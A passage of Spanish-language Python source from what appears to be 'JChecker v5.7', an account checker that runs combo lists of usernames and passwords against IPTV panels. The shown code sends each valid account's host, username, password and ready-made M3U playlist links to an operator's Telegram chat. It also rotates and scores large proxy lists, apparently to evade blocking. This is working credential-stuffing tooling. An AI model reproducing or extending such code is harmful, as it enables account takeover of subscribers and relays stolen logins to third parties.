    ┗━ 🏷️ <b>Categorías:</b> {'✅ Activadas' if stats_data.get('categories_enabled', False) else '❌ Desactivadas'}

    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    <i>🤖 JChecker v5.7 by JC | {stats_data.get('timestamp', datetime.now().strftime('%Y-%m-%d %H:%M:%S'))}</i>
    <i>⚡ Verificación completada exitosamente</i>"""

            bot.send_message(
                self.chat_id, 
                message,
                parse_mode='HTML',
                disable_web_page_preview=True
            )

            logger.info(f"Resumen mejorado enviado a Telegram")
            return True
        except Exception as e:
            logger.error(f"Error enviando resumen mejorado a Telegram: {e}")

            return self.send_summary(stats_data)

    def send_summary(self, stats_data):
        """Envía un resumen de la verificación a Telegram"""
        if not self.enabled or not self.token or not self.chat_id:
            return False

        try:
            bot = telebot.TeleBot(self.token)

            message = f"📊 *RESUMEN DE VERIFICACIÓN* 📊\n\n"
            message += f"🌐 *Portal:* `{stats_data.get('portal', 'Desconocido')}`\n"
            message += f"📁 *Combo:* `{os.path.basename(stats_data.get('combo_file', 'Desconocido'))}`\n"
            message += f"⏱️ *Duración:* `{self._format_time(stats_data.get('duration', 0))}`\n"
            message += f"⚡ *Velocidad:* `{stats_data.get('cpm', 0)} CPM`\n\n"

            message += f"📈 *Estadísticas:*\n"
            message += f"✅ Hits: `{stats_data.get('hits', 0)}`\n"
            message += f"❌ Fails: `{stats_data.get('fails', 0)}`\n"
            message += f"⚠️ Custom: `{stats_data.get('custom', 0)}`\n"
            message += f"🔄 Retries: `{stats_data.get('retries', 0)}`\n"
            message += f"🔍 Total Checked: `{stats_data.get('checked', 0)}`\n\n"

            message += f"📱 *Configuración:*\n"
            message += f"🤖 Bots: `{stats_data.get('threads', 0)}`\n"
            message += f"🔌 Proxies: `{'Activados' if stats_data.get('proxies_enabled', False) else 'Desactivados'}`\n"
            message += f"🏷️ Categorías: `{'Activadas' if stats_data.get('categories_enabled', False) else 'Desactivadas'}`\n\n"

            message += f"⏰ *Fecha/Hora:* `{stats_data.get('timestamp', datetime.now().strftime('%Y-%m-%d %H:%M:%S'))}`\n"
            message += f"📱 *JChecker v5.7 .1 por JC*"

            bot.send_message(
                self.chat_id, 
                message,
                parse_mode='Markdown',
                disable_web_page_preview=True
            )

            logger.info(f"Resumen enviado a Telegram")
            return True
        except Exception as e:
            logger.error(f"Error enviando resumen a Telegram: {e}")
            return False

    def send_formatted_hit_mod(self, formatted_text):
        """Envía hit con formato HTML mejorado a Telegram"""
        if not self.enabled or not self.token or not self.chat_id:
            return False

        try:
            bot = telebot.TeleBot(self.token)

            if not formatted_text or not formatted_text.strip():
                logger.error("Texto formateado está vacío")
                return False

            bot.send_message(
                self.chat_id, 
                formatted_text,
                parse_mode='HTML',
                disable_web_page_preview=False,  
                disable_notification=False,      
                protect_content=False           
            )

            logger.debug("Hit mejorado enviado exitosamente a Telegram")
            return True

        except Exception as e:
            logger.error(f"Error enviando hit mejorado a Telegram: {e}")

            try:

                clean_text = self._clean_html_for_fallback(formatted_text)

                bot.send_message(
                    self.chat_id,
                    clean_text,
                    disable_web_page_preview=True
                )

                logger.info("Hit enviado como fallback sin formato HTML")
                return True

            except Exception as e2:
                logger.error(f"Error en fallback mejorado de Telegram: {e2}")
                return False

    def _clean_html_for_fallback(self, html_text):
        """Limpia HTML de manera más inteligente para fallback"""
        import re

        text = html_text

        link_pattern = r'<a href="([^"]+)">([^<]+)</a>'
        text = re.sub(link_pattern, r'\2: \1', text)

        text = re.sub(r'<b>([^<]+)</b>', r'*\1*', text)
        text = re.sub(r'<strong>([^<]+)</strong>', r'*\1*', text)

        text = re.sub(r'<i>([^<]+)</i>', r'_\1_', text)
        text = re.sub(r'<em>([^<]+)</em>', r'_\1_', text)

        text = re.sub(r'<code>([^<]+)</code>', r'`\1`', text)

        text = re.sub(r'<[^>]+>', '', text)

        text = text.replace('&amp;', '&')
        text = text.replace('&lt;', '<')
        text = text.replace('&gt;', '>')
        text = text.replace('&quot;', '"')
        text = text.replace('&#x27;', "'")

        return text

    def send_formatted_hit_html(self, formatted_text):
        """Envía hit con formato HTML a Telegram - CORREGIDO"""
        if not self.enabled or not self.token or not self.chat_id:
            return False

        try:
            bot = telebot.TeleBot(self.token)

            if not formatted_text or not formatted_text.strip():
                logger.error("Texto formateado está vacío")
                return False

            bot.send_message(
                self.chat_id, 
                formatted_text,
                parse_mode='HTML',
                disable_web_page_preview=True
            )

            logger.debug("Hit enviado exitosamente a Telegram con formato HTML")
            return True

        except Exception as e:
            logger.error(f"Error enviando hit formateado a Telegram: {e}")

            try:
                import re

                fallback_text = re.sub(r'<[^>]+>', '', formatted_text)

                fallback_text = fallback_text.replace('&amp;', '&')
                fallback_text = fallback_text.replace('&lt;', '<')
                fallback_text = fallback_text.replace('&gt;', '>')
                fallback_text = fallback_text.replace('&quot;', '"')
                fallback_text = fallback_text.replace('&#x27;', "'")

                bot.send_message(
                    self.chat_id,
                    fallback_text,
                    disable_web_page_preview=True
                )

                logger.info("Hit enviado como fallback sin formato HTML")
                return True

            except Exception as e2:
                logger.error(f"Error en fallback de Telegram: {e2}")
                return False

    def _format_time(self, seconds):
        """Formatea un tiempo en segundos a formato legible"""
        hours = int(seconds // 3600)
        minutes = int((seconds % 3600) // 60)
        seconds = int(seconds % 60)
        return f"{hours:02d}:{minutes:02d}:{seconds:02d}"

    def _ensure_config_file(self):
        """Asegura que el archivo de configuración existe con estructura válida"""
        try:
            if not os.path.exists(self.config_file):

                with open(self.config_file, 'w', encoding='utf-8') as f:
                    json.dump({
                        "telegram": {
                            "bot_token": "",
                            "chat_id": "",
                            "user_name": ""
                        }
                    }, f, indent=4)
                print(f"Archivo de configuración creado: {self.config_file}")
            else:

                try:
                    with open(self.config_file, 'r', encoding='utf-8') as f:
                        json.load(f)
                except json.JSONDecodeError:

                    os.rename(self.config_file, f"{self.config_file}.bak")
                    with open(self.config_file, 'w', encoding='utf-8') as f:
                        json.dump({
                            "telegram": {
                                "bot_token": "",
                                "chat_id": "",
                                "user_name": ""
                            }
                        }, f, indent=4)
                    print(f"Archivo de configuración recreado (respaldo en {self.config_file}.bak)")
        except Exception as e:
            print(f"Error al verificar/crear archivo de configuración: {e}")

    def load_config(self):
        """Carga la configuración de Telegram desde el archivo"""
        try:
            with open(self.config_file, 'r', encoding='utf-8') as f:
                config = json.load(f)
                if 'telegram' in config:
                    telegram_config = config.get('telegram', {})
                    self.token = telegram_config.get('bot_token')
                    self.chat_id = telegram_config.get('chat_id')
                    self.user_name = telegram_config.get('user_name', "")

                    self.enabled = bool(self.token and self.chat_id)

                    if self.enabled:
                        print(f"Configuración de Telegram cargada correctamente.")
                    else:
                        print(f"Configuración de Telegram incompleta.")
        except Exception as e:
            print(f"Error al cargar configuración: {e}")
            self.token = None
            self.chat_id = None
            self.enabled = False

    def setup(self):
        """Configura Telegram interactivamente"""
        print(f"\n{Colors.CYAN}Configuración de Telegram{Colors.RESET}")

        if self.token and self.chat_id:
            print(f"{Colors.GREEN}Configuración existente:{Colors.RESET}")
            print(f"Bot Token: {self.token[:10]}...{self.token[-5:]}")
            print(f"Chat ID: {self.chat_id}")
            if self.user_name:
                print(f"Usuario: {self.user_name}")

            use_existing = input(f"{Colors.YELLOW}¿Usar esta configuración? (s/n, ENTER=s): {Colors.RESET}").lower()
            if use_existing == "" or use_existing == "s":
                self.enabled = True
                return self.test_connection()

        use_telegram = input(f"{Colors.YELLOW}¿Desea enviar hits a Telegram? (s/n): {Colors.RESET}").lower()
        if use_telegram != "s":
            self.enabled = False
            return False

        self.token = input(f"{Colors.YELLOW}Ingrese el Bot Token de Telegram: {Colors.RESET}").strip()
        self.chat_id = input(f"{Colors.YELLOW}Ingrese el Chat ID: {Colors.RESET}").strip()
        self.user_name = input(f"{Colors.YELLOW}Ingrese su nombre para mostrar (opcional): {Colors.RESET}").strip()

        if not self.token or not self.chat_id:
            print(f"{Colors.RED}Error: Token o Chat ID inválidos{Colors.RESET}")
            self.enabled = False
            return False

        self.save_config()
        return self.test_connection()

    def save_config(self):
        """Guarda la configuración en el archivo"""
        try:

            config = {}
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r', encoding='utf-8') as f:
                    try:
                        config = json.load(f)
                    except:
                        config = {}

            config['telegram'] = {
                'bot_token': self.token,
                'chat_id': self.chat_id,
                'user_name': self.user_name
            }

            with open(self.config_file, 'w', encoding='utf-8') as f:
                json.dump(config, f, indent=4)
            print(f"{Colors.GREEN}Configuración guardada correctamente{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}Error al guardar configuración: {e}{Colors.RESET}")

    def test_connection(self):
        """Prueba la conexión con Telegram"""
        try:
            if not self.token or not self.chat_id:
                return False

            bot = telebot.TeleBot(self.token)
            bot_info = bot.get_me()
            chat_info = bot.get_chat(self.chat_id)

            if hasattr(chat_info, 'username') and chat_info.username:
                receptor = f"{chat_info.first_name} - @{chat_info.username}"

            print(f"{Colors.GREEN}Conexión exitosa con Telegram")
            print(f"Bot conectado: {bot_info.first_name} (@{bot_info.username}){Colors.RESET}")
            print(f"Hits recibidos por: {receptor}")

            self.enabled = True
            return True
        except Exception as e:
            logger.error(f"Error al conectar con Telegram: {e}")
            print(f"{Colors.RED}Error al conectar con Telegram. Verifique el token.{Colors.RESET}")
            self.enabled = False
            return False

    def send_hit(self, hit_data):
        """Envía información de un hit a Telegram"""
        if not self.enabled or not self.token or not self.chat_id:
            return False

        try:
            bot = telebot.TeleBot(self.token)

            message = self.format_hit_message(hit_data)

            bot.send_message(
                self.chat_id, 
                message,
                parse_mode='HTML',
                disable_web_page_preview=True
            )

            if 'html_file' in hit_data and os.path.exists(hit_data['html_file']):
                with open(hit_data['html_file'], 'rb') as html:
                    bot.send_document(
                        self.chat_id,
                        html,
                        caption="Reporte detallado"
                    )

            return True
        except Exception as e:
            logger.error(f"Error enviando hit a Telegram: {e}")

            try:
                clean_message = self.format_hit_message(hit_data, use_html=False)
                bot.send_message(
                    self.chat_id,
                    clean_message,
                    disable_web_page_preview=True
                )
                return True
            except Exception as e2:
                logger.error(f"Error en segundo intento de envío a Telegram: {e2}")
                return False

    def format_hit_message_mod(self, hit_data, use_html=True):
        """Formatea un mensaje mejorado para Telegram con diseño moderno"""

        if not use_html:

            return self.format_hit_message_original(hit_data, use_html)

        portal = hit_data.get('portal', '')
        user = hit_data.get('user', '')
        password = hit_data.get('pass', '')
        expire = hit_data.get('expire', 'No expira')
        active_cons = hit_data.get('active_cons', '0')
        max_cons = hit_data.get('max_cons', '0')
        live_count = hit_data.get('live_count', '?')
        vod_count = hit_data.get('vod_count', '?')
        series_count = hit_data.get('series_count', '?')
        categories = hit_data.get('categories', '')

        country = self._get_country_info(portal)

        is_trial = "Not Trial" if not ("trial" in user.lower() or "test" in user.lower()) else "Trial"

        if not portal.startswith(("http://", "https://")):

            protocol = hit_data.get('protocol', 'http')
            panel_with_protocol = f"{protocol}://{portal}"
        else:
            panel_with_protocol = portal

        is_xui = hit_data.get('is_xui', False)
        m3u_link = build_m3u_url(panel_with_protocol, user, password, is_xui)
        epg_link = build_epg_url(panel_with_protocol, user, password, is_xui)

        user_escaped = self._escape_html_safe(user)
        password_escaped = self._escape_html_safe(password)
        panel_escaped = self._escape_html_safe(panel_with_protocol)
        if active_cons == 'N/A':
            active_cons = 0
        if max_cons == "N/A":
            max_cons = 0

        message = f"""────────────────────────
             ★彡ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ彡★ 
────────────────────────
➥🆙 Active
➥🧪 {is_trial}
➥🌐 {panel_escaped}
➥👤 {user_escaped}
➥🔑 {password_escaped}
➥⏲ {expire}
➥👁 {active_cons} / {max_cons}
➥📍 {country}
────────────────────────
                 ★彡ᴄᴏɴᴛᴇɴᴛ彡★
────────────────────────
➥📺 {live_count}
➥🎥 {vod_count}
➥📹 {series_count}

➥🔗<a href="{m3u_link}">M3U</a>   |   <a href="{epg_link}">EPG</a>
"""

        if categories and categories.strip():
            categories_lines = categories.split('\n')
            formatted_categories = []
            for line in categories_lines[:80]:
                if line.strip():
                    cleaned_line = line.strip()
                    import re
                    cleaned_line = re.sub(r'^\s*➠\s*', '', cleaned_line)
                    formatted_categories.append(f" ➠ {cleaned_line}")

            if formatted_categories:
                message += f"""
────────────────────────
                ★彡ᴄᴀᴛᴇɢᴏʀíᴀs彡★
────────────────────────
"""
                message += '\n'.join(formatted_categories)

        current_time = datetime.now().strftime("%Y-%m-%d -- %H:%M:%S")

        user_display = self.user_name if self.user_name else "JC"

        message += f"""

────────────────────────
                  Hit por {user_display}                   
              {current_time}"""
        return message

    def format_hit_message_original(self, hit_data, use_html=True):
        """Método original preservado para compatibilidad"""
        b_open = "<b>" if use_html else ""
        b_close = "</b>" if use_html else ""
        code_open = "<code>" if use_html else ""
        code_close = "</code>" if use_html else ""

        message = f"{b_open}╭➤ 𝗛𝗶𝘁𝘀 ʙʏ ★彡【ＪＣ】彡★{b_close}\n"
        _portal_orig = hit_data.get('portal', '')
        _protocol_orig = hit_data.get('protocol', 'http')
        _panel_orig = _portal_orig if _portal_orig.startswith(("http://", "https://")) else f"{_protocol_orig}://{_portal_orig}"
        _is_xui_orig = hit_data.get('is_xui', False)
        message += f"├●🌐 Host ➤ {_panel_orig}\n"
        message += f"├●👤 User ➤ {code_open}{hit_data.get('user', '')}{code_close}\n"
        message += f"├●🔑 Pass ➤ {code_open}{hit_data.get('pass', '')}{code_close}\n"
        message += f"├●📆 Exp.  ➤ {hit_data.get('expire', '')}\n"
        message += f"├●👥 Act Con   ➤ {hit_data.get('active_cons', '0')}\n"
        message += f"├●👪 Max Con ➤ {hit_data.get('max_cons', '0')}\n"
        message += f"├●⚡ Status     ➤ {hit_data.get('status', '')}\n"
        message += f"╰─➤ 𝗛𝗶𝘁𝘀 ʙʏ ★彡【ＪＣ】彡★"

        live_count = hit_data.get('live_count', '')
        vod_count = hit_data.get('vod_count', '')
        series_count = hit_data.get('series_count', '')

        if live_count or vod_count or series_count:
            message += f"\n╭● 🎬 En Vivo    ➤ {live_count}\n"
            message += f"├● 🎬 Películas ➤ {vod_count}\n"
            message += f"├● 🎬 Series      ➤ {series_count}\n"
            message += f"╰─────────────── •"

        message += f"\n●🔗m3u_Url➤{build_m3u_url(_panel_orig, hit_data.get('user', ''), hit_data.get('pass', ''), _is_xui_orig)}"

        categories = hit_data.get('categories', '')
        if categories:
            message += f"\n{b_open}╭➤Categorías en Vivo➤{b_close}\n"
            for cat in categories.split('🔹')[1:]:
                if cat.strip():
                    message += f"├●{cat.strip()}\n"
            message += f"╰──{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}── •"

        return message

    def format_hit_message(self, hit_data, use_html=True):
        """Método principal que decide qué formato usar"""

        try:
            return self.format_hit_message_mod(hit_data, use_html)
        except Exception as e:
            logger.error(f"Error en formato mejorado: {e}")

            return self.format_hit_message_original(hit_data, use_html)

class ProxyManager:
    """Gestiona la carga, verificación y uso de proxies - VERSIÓN COMPLETA CORREGIDA"""

    def __init__(self):
        self.proxies = []
        self.active_proxies = []
        self.proxy_index = 0
        self.lock = threading.RLock()
        self.enabled = False
        self.proxy_type = ""
        self.proxy_file = ""

        self.rotation_counter = 0
        self.force_rotation_interval = 25  
        self.last_forced_rotation = 0  
        self.force_rotation_seconds = 2  

        self.time_based_rotation = True  
        self.rotation_interval = 15  
        self.blacklisted_proxies = set()  
        self.proxy_timeouts = {}  
        self.max_proxy_timeout = 2.0  
        self.hard_timeout_enabled = True  
        self.last_rotation_time = time.time()  
        self.auto_rotation_enabled = True  

        self.proxy_scores = {}  
        self.proxy_response_times = {}  
        self.proxy_failures = {}  
        self.proxy_last_used = {}  
        self.proxy_success_rate = {}  

        self.good_proxies = set()  
        self.bad_proxies = set()   
        self.quarantine_proxies = {}  

        self.proxy_stats = {
            'total': 0,
            'good': 0,
            'bad': 0,
            'quarantine': 0
        }

        self.min_score_threshold = 30  
        self.quarantine_time = 300  
        self.max_failures_before_quarantine = 3
        self.response_time_history_size = 10

        self.cache_file = 'proxy_cache/proxy_scores.pkl'
        self._load_proxy_cache()

    def _load_proxy_cache(self):
        """Carga información persistente de proxies del cache"""
        try:
            if os.path.exists(self.cache_file):
                with open(self.cache_file, 'rb') as f:
                    import pickle
                    cache_data = pickle.load(f)
                    self.proxy_scores = cache_data.get('scores', {})
                    self.proxy_response_times = cache_data.get('response_times', {})
                    self.proxy_success_rate = cache_data.get('success_rates', {})
                    self.good_proxies = cache_data.get('good_proxies', set())
                    self.bad_proxies = cache_data.get('bad_proxies', set())

                logger.info(f"Cache de proxies cargado: {len(self.proxy_scores)} proxies en histórico")
        except Exception as e:
            logger.debug(f"No se pudo cargar cache de proxies: {e}")

    def _save_proxy_cache(self):
        """Guarda información de proxies en cache para persistencia"""
        try:
            os.makedirs('proxy_cache', exist_ok=True)
            cache_data = {
                'scores': self.proxy_scores,
                'response_times': self.proxy_response_times,
                'success_rates': self.proxy_success_rate,
                'good_proxies': self.good_proxies,
                'bad_proxies': self.bad_proxies,
                'timestamp': time.time()
            }

            import pickle
            with open(self.cache_file, 'wb') as f:
                pickle.dump(cache_data, f)

            logger.debug("Cache de proxies guardado")
        except Exception as e:
            logger.error(f"Error guardando cache de proxies: {e}")

    def _calculate_proxy_score(self, proxy_str):
        """Calcula un score de 0-100 para un proxy basado en múltiples factores"""
        score = 50  

        success_rate = self.proxy_success_rate.get(proxy_str, 0.5)
        score += (success_rate - 0.5) * 80  

        response_times = self.proxy_response_times.get(proxy_str, [])
        if response_times:
            avg_time = sum(response_times) / len(response_times)

            if avg_time < 1:
                score += 15
            elif avg_time < 2:
                score += 5
            elif avg_time > 5:
                score -= 20
            elif avg_time > 3:
                score -= 10

        last_used = self.proxy_last_used.get(proxy_str, 0)
        time_since_used = time.time() - last_used
        if time_since_used > 300:  
            score += 5  
        elif time_since_used < 10:  
            score -= 5

        failures = self.proxy_failures.get(proxy_str, 0)
        score -= failures * 5  

        if proxy_str in self.good_proxies:
            score += 10
        elif proxy_str in self.bad_proxies:
            score -= 30

        return max(0, min(100, score))  

    def _update_proxy_performance(self, proxy_str, success, response_time=None):
        """Actualiza las métricas de rendimiento de un proxy"""
        with self.lock:

            if proxy_str not in self.proxy_success_rate:
                self.proxy_success_rate[proxy_str] = 0.5  

            current_rate = self.proxy_success_rate[proxy_str]

            alpha = 0.3  
            new_rate = alpha * (1 if success else 0) + (1 - alpha) * current_rate
            self.proxy_success_rate[proxy_str] = new_rate

            if response_time is not None:
                if proxy_str not in self.proxy_response_times:
                    self.proxy_response_times[proxy_str] = []

                times = self.proxy_response_times[proxy_str]
                times.append(response_time)

                if len(times) > self.response_time_history_size:
                    times.pop(0)

            if not success:
                self.proxy_failures[proxy_str] = self.proxy_failures.get(proxy_str, 0) + 1

                if self.proxy_failures[proxy_str] >= self.max_failures_before_quarantine:
                    self.quarantine_proxies[proxy_str] = time.time() + self.quarantine_time
                    logger.debug(f"Proxy {proxy_str} puesto en cuarentena por {self.max_failures_before_quarantine} fallos")
            else:

                if proxy_str in self.proxy_failures:
                    self.proxy_failures[proxy_str] = max(0, self.proxy_failures[proxy_str] - 1)

            self.proxy_last_used[proxy_str] = time.time()

            self.proxy_scores[proxy_str] = self._calculate_proxy_score(proxy_str)

    def load_proxies_from_file(self, filename, proxy_type="http"):
        """Carga proxies con filtrado de puertos problemáticos y validación de SOCKS support"""
        if not os.path.exists(filename):
            logger.error(f"Archivo de proxies no encontrado: {filename}")
            return False

        self.proxy_file = filename
        self.proxy_type = proxy_type

        if proxy_type.lower() in ['socks5', 'socks4', '5', '4']:
            if not SOCKS_SUPPORT:
                print(f"\n{Colors.RED}{'='*70}{Colors.RESET}")
                print(f"{Colors.RED}{Colors.BOLD}ADVERTENCIA: PROXIES SOCKS SIN SOPORTE{Colors.RESET}")
                print(f"{Colors.YELLOW}Para usar proxies SOCKS5/SOCKS4 con autenticación, necesita instalar:{Colors.RESET}")
                print(f"{Colors.WHITE}  pip install pysocks requests[socks]{Colors.RESET}")
                print(f"\n{Colors.YELLOW}Sin estas librerías, los proxies SOCKS pueden:{Colors.RESET}")
                print(f"{Colors.WHITE}  • No funcionar correctamente{Colors.RESET}")
                print(f"{Colors.WHITE}  • Retornar errores de conexión{Colors.RESET}")
                print(f"{Colors.WHITE}  • Redireccionar tráfico incorrectamente{Colors.RESET}")
                print(f"{Colors.RED}{'='*70}{Colors.RESET}\n")

                continuar = input(f"{Colors.YELLOW}¿Continuar de todos modos? (s/n): {Colors.RESET}").lower()
                if continuar != 's':
                    print(f"{Colors.CYAN}Operación cancelada.{Colors.RESET}")
                    return False
                print(f"{Colors.YELLOW}Continuando sin soporte SOCKS... Los resultados pueden ser imprecisos.{Colors.RESET}\n")

        print(f"{Colors.CYAN}Cargando proxies desde {filename} con filtrado...{Colors.RESET}")

        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                raw_proxies = [line.strip() for line in f if line.strip()]

            total_count = len(raw_proxies)

            PROBLEMATIC_PORTS = [':4145', ':1080', ':9050', ':3128']

            filtered_proxies = []
            filtered_count = 0

            for proxy in raw_proxies:
                if any(bad_port in proxy for bad_port in PROBLEMATIC_PORTS):
                    filtered_count += 1
                    logger.debug(f"Proxy filtrado por puerto problemático: {proxy}")
                    continue
                filtered_proxies.append(proxy)

            print(f"{Colors.GREEN}Proxies cargados: {total_count}{Colors.RESET}")
            print(f"{Colors.YELLOW}Proxies filtrados por puertos problemáticos: {filtered_count}{Colors.RESET}")
            print(f"{Colors.GREEN}Proxies utilizables: {len(filtered_proxies)}{Colors.RESET}")

            if not filtered_proxies:
                print(f"{Colors.RED}No quedan proxies después del filtrado.{Colors.RESET}")
                return False

            print(f"{Colors.CYAN}Cargando proxies sin verificar para inicio rápido...{Colors.RESET}")
            return self._load_unverified_proxies(filtered_proxies, proxy_type)

        except Exception as e:
            logger.error(f"Error al cargar proxies: {e}")
            return False

    def force_sync_display(self):
        """Fuerza la sincronización para el display"""
        if self.enabled:  
            if self.active_proxies:  
                first_proxy_info = self.active_proxies[0]
                self.current_proxy = first_proxy_info

                logger.info(f"Display sincronizado: proxy actual = {self._proxy_to_str(first_proxy_info)}")
                return True
        return False

    def load_proxies_from_file_backup(self, filename, proxy_type="http"):
        """Carga proxies con detección automática de archivos verificados"""
        if not os.path.exists(filename):
            logger.error(f"Archivo de proxies no encontrado: {filename}")
            return False

        self.proxy_file = filename
        self.proxy_type = proxy_type

        print(f"{Colors.CYAN}Cargando proxies desde {filename}...{Colors.RESET}")

        verified_file = self._find_verified_version(filename)

        if verified_file:
            print(f"{Colors.GREEN}[OK] Se encontro version verificada: {os.path.basename(verified_file)}{Colors.RESET}")
            use_verified = input(f"{Colors.YELLOW}¿Usar la versión ya verificada? (s/n, RECOMENDADO): {Colors.RESET}").lower()

            if use_verified in ['s', 'y', '']:  
                return self._load_verified_proxies(verified_file, proxy_type)

        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                raw_proxies = [line.strip() for line in f if line.strip()]

            total_count = len(raw_proxies)
            print(f"{Colors.GREEN}Se cargaron {total_count} proxies del archivo.{Colors.RESET}")

            verify_proxies = input(f"{Colors.YELLOW}¿Desea verificar los proxies? (s/n): {Colors.RESET}").lower()

            if verify_proxies == 's':
                return self.verify_proxies_optimized(raw_proxies, proxy_type)
            else:

                return self._load_unverified_proxies(raw_proxies, proxy_type)

        except Exception as e:
            logger.error(f"Error al cargar proxies: {e}")
            return False

    def _find_verified_version(self, original_file):
        """Busca la versión verificada de un archivo de proxies"""
        try:

            base_name = os.path.basename(original_file)
            name_parts = base_name.replace('.txt', '').split('_')

            proxy_dir = 'Proxies'
            if not os.path.exists(proxy_dir):
                return None

            proxy_type = None
            date_str = None

            for part in name_parts:
                if part in ['socks4', 'socks5', 'http', 'https']:
                    proxy_type = part
                elif len(part) == 8 and part.isdigit():  
                    date_str = part

            if not proxy_type or not date_str:
                return None

            for file in os.listdir(proxy_dir):
                if file.endswith('.txt'):
                    file_lower = file.lower()

                    if (proxy_type in file_lower and 
                        date_str in file and
                        any(indicator in file_lower for indicator in [
                            'valid_', 'portal_tested', 'verified_', 'tested_'
                        ])):

                        return os.path.join(proxy_dir, file)

            return None

        except Exception as e:
            logger.debug(f"Error buscando versión verificada: {e}")
            return None

    def _load_verified_proxies(self, verified_file, proxy_type):
        """Carga proxies ya verificados manejando diferentes formatos"""
        try:
            with open(verified_file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip() and not line.startswith('#')]

            print(f"{Colors.GREEN}Cargando {len(lines)} proxies ya verificados...{Colors.RESET}")

            proxies = []
            for line in lines:
                proxy_part = None

                if '|' in line:

                    proxy_part = line.split('|')[0].strip()
                elif ' - ' in line:

                    proxy_part = line.split(' - ')[0].strip()
                elif '\t' in line:

                    proxy_part = line.split('\t')[0].strip()
                else:

                    proxy_part = line.strip()

                if proxy_part and ':' in proxy_part:

                    parts = proxy_part.split(':')
                    if len(parts) >= 2:
                        ip_part = parts[0]
                        port_part = parts[1]

                        try:

                            port_num = int(port_part)
                            if 1 <= port_num <= 65535:

                                ip_octets = ip_part.split('.')
                                if len(ip_octets) == 4 and all(0 <= int(octet) <= 255 for octet in ip_octets):
                                    proxies.append(proxy_part)
                        except ValueError:

                            if len(parts) >= 4:
                                try:
                                    port_num = int(parts[1])
                                    if 1 <= port_num <= 65535:
                                        proxies.append(proxy_part)
                                except ValueError:
                                    continue

            logger.info(f"Proxies extraídos exitosamente: {len(proxies)} de {len(lines)} líneas")

            self.proxies = proxies
            self.active_proxies = []

            for proxy in proxies:
                proxy_formatted = self._format_proxy(proxy, proxy_type)
                if proxy_formatted:
                    self.active_proxies.append(proxy_formatted)

                    proxy_str = self._proxy_to_str(proxy_formatted)
                    self.proxy_scores[proxy_str] = 85  
                    self.good_proxies.add(proxy_str)

            self.portal_verified_proxies = True

            valid_count = len(self.active_proxies)
            print(f"{Colors.GREEN}[OK] {valid_count} proxies verificados cargados correctamente{Colors.RESET}")
            print(f"{Colors.CYAN}Listos para usar sin verificación adicional{Colors.RESET}")

            if valid_count > 0:
                self.enabled = True
                return True
            else:
                self.enabled = False
                print(f"{Colors.RED}No se pudieron cargar proxies válidos del archivo{Colors.RESET}")
                return False

        except Exception as e:
            logger.error(f"Error cargando proxies verificados: {e}")
            return False

    def _load_unverified_proxies(self, raw_proxies, proxy_type):
        """Carga proxies sin verificar, solo formatearlos"""
        try:
            self.proxies = raw_proxies
            self.active_proxies = []

            for proxy in raw_proxies:
                formatted = self._format_proxy(proxy, proxy_type)
                if formatted:
                    self.active_proxies.append(formatted)

                    proxy_str = self._proxy_to_str(formatted)
                    self.proxy_scores[proxy_str] = 50  

            valid_count = len(self.active_proxies)
            print(f"{Colors.GREEN}Proxies cargados sin verificar: {valid_count}/{len(raw_proxies)}{Colors.RESET}")
            print(f"{Colors.YELLOW}Nota: Los proxies no han sido verificados y pueden tener fallas{Colors.RESET}")
            logger.warning(f"[OK] PROXY MANAGER HABILITADO: {valid_count} proxies activos")

            if valid_count > 0:
                self.enabled = True
                return True
            else:
                self.enabled = False
                return False

        except Exception as e:
            logger.error(f"Error cargando proxies sin verificar: {e}")
            return False

    def _detect_portal_verified_file(self, filename):
        """Detecta si el archivo contiene proxies ya verificados contra portal"""
        try:

            filename_lower = filename.lower()
            portal_indicators = [
                'portal_tested',
                'verified_against', 
                'portal_verified',
                '_portal_',
                'tested_',  
                'valid_'
            ]

            if any(indicator in filename_lower for indicator in portal_indicators):
                return True

            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                first_lines = [f.readline().strip() for _ in range(5)]

            content_text = ' '.join(first_lines).lower()
            content_indicators = [
                'verificados contra portal',
                'verified against portal', 
                'portal tested',
                'ordenados por velocidad',
                'tiempo_respuesta',
                'score:'
            ]

            if any(indicator in content_text for indicator in content_indicators):
                return True

            return False

        except Exception:
            return False

    def verify_proxies_optimized(self, proxy_list, proxy_type):
       """Verifica proxies con sistema optimizado de alta velocidad"""
       print(f"\n{Colors.CYAN}Verificando proxies con sistema optimizado...{Colors.RESET}")

       import multiprocessing
       cpu_count = multiprocessing.cpu_count()

       has_auth_proxies = any(':' in p and len(p.split(':')) >= 4 for p in proxy_list)
       if has_auth_proxies:
           max_workers = min(300, cpu_count * 30)  
       else:
           max_workers = min(500, cpu_count * 50)  

       print(f"{Colors.YELLOW}Usando {max_workers} workers para verificación paralela{Colors.RESET}")

       valid_proxies = []
       total = len(proxy_list)

       widgets = [
           f'{Colors.GREEN}Verificando: {Colors.RESET}',
           progressbar.Percentage(),
           ' ',
           progressbar.Bar(marker=f'{Colors.GREEN}█{Colors.RESET}'),
           ' ',
           progressbar.ETA(),
           ' ',
           progressbar.Counter()
       ]

       bar = progressbar.ProgressBar(widgets=widgets, max_value=total).start()

       def verify_worker_optimized(proxy_data):
           """Worker optimizado para verificar un proxy"""
           proxy, index = proxy_data
           try:
               start_time = time.time()

               proxy_formatted = self._format_proxy(proxy, proxy_type)

               if proxy_formatted:
                   proxy_str = self._proxy_to_str(proxy_formatted)

                   if proxy_str in self.proxy_scores:
                       cached_score = self.proxy_scores[proxy_str]
                       if cached_score > 70:  
                           bar.update(index + 1)
                           return (proxy, proxy_formatted, True, time.time() - start_time)
                       elif cached_score < 20:  
                           bar.update(index + 1)
                           return (proxy, proxy_formatted, False, time.time() - start_time)

                   result = self._test_proxy_fast(proxy_formatted)
                   response_time = time.time() - start_time

                   bar.update(index + 1)
                   return (proxy, proxy_formatted, result, response_time)
               else:
                   bar.update(index + 1)
                   return (proxy, None, False, 0)

           except Exception as e:
               logger.debug(f"Error verificando proxy {proxy}: {e}")
               bar.update(index + 1)
               return (proxy, None, False, 0)

